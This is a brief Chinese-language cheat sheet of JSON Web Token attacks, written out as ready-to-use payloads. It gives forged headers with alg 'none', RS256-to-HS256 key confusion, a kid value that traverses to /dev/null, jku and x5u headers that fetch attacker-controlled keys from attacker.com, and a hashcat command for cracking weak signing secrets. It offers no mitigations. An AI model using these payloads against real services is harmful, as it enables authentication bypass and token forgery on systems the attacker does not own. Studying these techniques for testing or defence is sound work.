# JWT安全

## 1. None算法攻击

```json
{"alg":"none","typ":"JWT","payload":"..."}
{"alg":"None","typ":"JWT","payload":"..."}
```

## 2. 密钥混淆攻击(RS256->HS256)

将RS256的公钥作为HS256的密钥签名

## 3. KID注入

```json
{"alg":"HS256","typ":"JWT","kid":"../../../../../dev/null"}
{"alg":"HS256","typ":"JWT","kid":"key-1"}
```

## 4. jku注入

```json
{"alg":"RS256","typ":"JWT","jku":"http://attacker.com/jwk.json"}
```

## 5. x5u注入

```json
{"alg":"RS256","typ":"JWT","x5u":"http://attacker.com/cert.pem"}
```

## 6. 弱密钥爆破

```bash
hashcat -m 16500 jwt.txt wordlist.txt
```

## 7. 算法混淆

```json
{"alg":"HS256","typ":"JWT"}
使用公钥作为密钥
```
